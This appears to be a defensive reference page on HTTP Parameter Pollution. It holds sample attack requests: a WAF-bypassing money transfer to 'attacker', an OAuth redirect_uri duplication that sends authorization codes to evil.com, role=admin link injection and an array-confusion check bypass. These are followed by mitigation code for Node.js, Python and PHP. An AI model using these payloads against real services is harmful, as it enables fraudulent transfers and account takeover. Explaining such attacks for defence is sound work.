HTTP Parameter Pollution (HPP) exploits the fact that different layers of a web stack parse duplicate query parameters differently — what the WAF sees is not what the backend uses.

Server-side HPP — WAF bypass High severity

WAF checks the safe first value; backend uses the injected second value.

GET /transfer?to=alice&to=attacker&amount=5000 HTTP/1.1
WAF sees to=alice (safe) → passes. PHP app uses to=attacker (last).
OAuth token hijack Critical

The authorization server concatenates duplicate redirect_uri, sending the code to the attacker's URL.

GET /oauth/authorize ?redirect_uri=https://app.com/cb &redirect_uri=https://evil.com/steal &client_id=123 &response_type=code
Some servers concatenate: redirect_uri=https://app.com/cb,https://evil.com/steal — the code goes to evil.com.
Client-side HPP — link injection Medium

Reflected user input is placed in a URL before an existing parameter, poisoning the link.

<!-- User input: "&role=admin" --> <a href="/profile?user=alice&role=admin&role=user"> <!-- Browser may read role=admin (first wins) -->
Logic bypass via array confusion Variable

Backend receives an array instead of a string, causing type coercion failures in comparisons.

POST /api/transfer Content-Type: application/x-www-form-urlencoded amount=100&amount=99999 // Node.js: req.body.amount → ['100','99999'] // '100' == ['100','99999'] → false → check skipped!

Presets

① Explicitly pick one value Best
Never rely on the framework's default. Always select the first or last occurrence deliberately.
// Node.js — force first value const to = Array.isArray(req.query.to) ? req.query.to[0] : req.query.to; // Python — force first value to = request.args.getlist('to')[0] // PHP — use first explicitly $to = is_array($_GET['to']) ? $_GET['to'][0] : $_GET['to'];
② Reject requests with duplicate params Strict
If your API never sends duplicate parameters legitimately, treat any duplicate as an attack signal.
// Express middleware — block duplicates app.use((req, res, next) => { for (const [k, v] of Object.entries(req.query)) { if (Array.isArray(v)) { return res.status(400).json({ error: `Duplicate parameter: ${k}` }); } } next(); });
③ Consistent parsing across layers Architectural
Ensure your WAF, load balancer, and backend all use the same parameter parsing strategy. Document the chosen behavior. An inconsistency at any boundary is an HPP vector.
